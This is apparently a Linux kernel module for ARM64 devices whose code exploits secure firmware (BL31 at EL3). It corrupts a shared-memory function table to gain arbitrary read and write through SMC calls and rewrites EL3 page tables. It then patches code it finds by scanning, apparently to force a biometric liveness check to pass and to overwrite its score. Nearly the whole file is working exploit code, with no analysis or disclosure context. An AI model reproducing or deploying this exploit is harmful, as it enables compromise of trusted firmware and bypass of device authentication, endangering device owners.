#include <linux/module.h>  /* Needed by all modules */
#include <linux/kernel.h>  /* Needed for KERN_ALERT */
#include <asm/io.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/fs.h>
#include <linux/mutex.h>
#include <linux/slab.h>
#include <linux/io.h>
#include <linux/random.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hhj4ck, 2019");
MODULE_DESCRIPTION("Assistant Module");

static noinline unsigned long long smc_call(unsigned long long function_id, unsigned long long arg0, unsigned long long arg1, unsigned long long arg2)
{
  register u64 x0 asm("x0") = function_id;
  register u64 x1 asm("x1") = arg0;
  register u64 x2 asm("x2") = arg1;
  register u64 x3 asm("x3") = arg2;

  asm volatile(
      __asmeq("%0", "x0")
      __asmeq("%1", "x1")
      __asmeq("%2", "x2")
      __asmeq("%3", "x3")
      "smc  #0\n"
      : "+r" (x0)
      : "r" (x1), "r" (x2), "r" (x3));

  return x0;
}

#define bl31_sharedmem 0x209E9000
#define function_table 0x1FE2AE58
#define vtable_offset 0xC38
#define write_mem 0x1FE01F9C
#define set_buff_table 0x1FE01F88 
#define enable_mmu_el3 0x1FE1BC00

#define write_gadget 0x1FE002E8
//str w1, [x0, 8]
//ret

#define read_gadget 0x1FE054C0
//LDR W0, [X0,#0x18]
//RET

void write_bl31_mem(unsigned long long addr, unsigned long long value)
{
  char *ptr = 0;
  ptr = ioremap_nocache(bl31_sharedmem, 0x18000);
  *(unsigned long long *)(ptr + addr - bl31_sharedmem) = value;
  if(ptr!=0)
    iounmap(ptr);
}

unsigned long long bl31_call(unsigned long long calladdr, unsigned long long param)
{
  write_bl31_mem(bl31_sharedmem + 0x6000 + vtable_offset, calladdr);
  return smc_call(0xC600FF06, param, 0, 0);
}

void mem_write_corrupt(unsigned long long addr, unsigned long long value)
{
  //addr = value
  //addr + 0x0c = 0x1fe921c;
  bl31_call(set_buff_table, addr - 4);
  bl31_call(write_mem, value);
}

void wd(unsigned long long addr, unsigned long long value)
{
  smc_call(0xC500AA01, addr - 8, value, 0x55BBCCE0 + 1);
}

void wq(unsigned long long addr, unsigned long long value)
{
  wd(addr, value);
  wd(addr + 4, value >> 32);
}

unsigned int rd(unsigned long long addr)
{
  return smc_call(0xC500AA01, addr - 0x18, 0, 0x55BBCCE0 + 2);
}

unsigned long long rq(unsigned long long addr)
{
  unsigned long long ret;
  ret = rd(addr + 4);
  ret<<=32;
  ret|= rd(addr);
  return ret;
}

void reload_pte(void)
{
  bl31_call(enable_mmu_el3, 0);
}

#define TTBR0_EL3 0x1FE3B480
unsigned long long search_pte(unsigned long long target_addr)
{
  unsigned long long tabledes;
  unsigned long long table;
  unsigned long long block;
  unsigned long long value;
  unsigned long long op;
  unsigned long long level0_addr;
  unsigned long long level1_addr;
  unsigned long long level2_addr;
  for(level0_addr = TTBR0_EL3; level0_addr < TTBR0_EL3+ 4 * 8; level0_addr += 8)
  {
    tabledes = rq(level0_addr);
    if((tabledes & 0x3) == 0)
      break;
    tabledes = tabledes & 0xFFFFFFFFFFFFF000;
    for(level1_addr = tabledes; level1_addr < tabledes + 512 * 8; level1_addr += 8)
    {
      value = rq(level1_addr);
      if((value & 0x3) == 0x3)
      {
        table = value;
        table = table & 0xFFFFF000;
        for(level2_addr = table; level2_addr < table + 512 * 8; level2_addr += 8)
        {
          block = rq(level2_addr);
          if(block == 0)
            continue;
          op = block & 0xFFFFF000;
          if(op == target_addr)
            return level2_addr;
        }
      }
      else if((value & 0x3) == 0x1)
      {
        block = value;
        op = block & 0xFFFFF000;
        if(op == target_addr)
          return level1_addr;
      }
    }
  }
  return 0;
}

void exploit_init(void)
{
  mem_write_corrupt(function_table + 1 * 8, write_gadget);
  mem_write_corrupt(function_table + 2 * 8, read_gadget);
}

void mod_live(unsigned int addr)
{
  unsigned int base = (addr & 0x1fffff) | 0x18000000;

  unsigned long entry = search_pte(0x18000000);
  wq(entry, 0x40000000000000 | (addr & 0xffe00000) | 0x701);
  reload_pte();

  wd(base + 0x196638 - 0x196440, 0xE3A00000);

  wq(entry, 0x40000000000000 | 0x18000000 | 0x629);
  reload_pte();
}

void mod_score(unsigned int addr)
{
  unsigned int base = (addr & 0x1fffff) | 0x18000000;

  unsigned long entry = search_pte(0x18000000);
  wq(entry, 0x40000000000000 | (addr & 0xffe00000) | 0x701);
  reload_pte();

  // mov r0, #0
  wd(base + 0x00000000, 0xe3a00000);
  // str r0, [r1]
  wd(base + 0x00000004, 0xe5810000);
  // str r0, [r1, #8]
  wd(base + 0x00000008, 0xe5810008);
  // mov r0, #1
  wd(base + 0x0000000c, 0xe3a00001);
  // str r0, [r1, #16]
  wd(base + 0x00000010, 0xe5810010);
  // mov r0, #0xcf
  wd(base + 0x00000014, 0xe3a000cf);
  // add r0, r0, #0x8500
  wd(base + 0x00000018, 0xe2800c85);
  // movt r0, #0x42ba
  wd(base + 0x0000001c, 0xe34402ba);
  // str r0, [r1, #4]
  wd(base + 0x00000020, 0xe5810004);
  // mov r0, #0
  wd(base + 0x00000024, 0xe3a00000);
  // movt r0, #0xbf80
  wd(base + 0x00000028, 0xe34b0f80);
  // str r0, [r1, #12]
  wd(base + 0x0000002c, 0xe581000c);
  // mov r0, #0
  wd(base + 0x00000030, 0xe3a00000);
  // mov r0, #0
  wd(base + 0x00000034, 0xe3a00000);
  // mov r0, #0
  wd(base + 0x00000038, 0xe3a00000);
  // mov r0, #0
  wd(base + 0x0000003c, 0xe3a00000);

  wq(entry, 0x40000000000000 | 0x18000000 | 0x629);
  reload_pte();
}

unsigned int live_addr;
unsigned int score_addr;
void search_addr(void)
{
  unsigned long long addr;
  unsigned long value;
  unsigned flag = 2;
  unsigned long live_target = 0xE58d700ce58d9000;
  unsigned long score_target= 0xE59D1074f4650a8d;
  for(addr = 0x1d000000; addr < 0x1fe00000; addr += 4)
  {
    value = rq(addr);
    if (value == live_target)
    {
      live_addr = addr;
      printk(KERN_ALERT "find live 0x%08x\n", addr);
      flag--;
    }
    if (value == score_target)
    {
      score_addr = addr;
      printk(KERN_ALERT "find score 0x%08x\n", addr);
      flag--;
    }
    if(!flag)
      return;
  }
}

int init_module(void)
{
  exploit_init();
  search_addr();
  mod_live(live_addr - 8);
  mod_score(score_addr + 0x34 - 0x2c);
  return 0;
}

void cleanup_module(void)
{
  printk(KERN_ALERT "exploit is removed.\n");
}

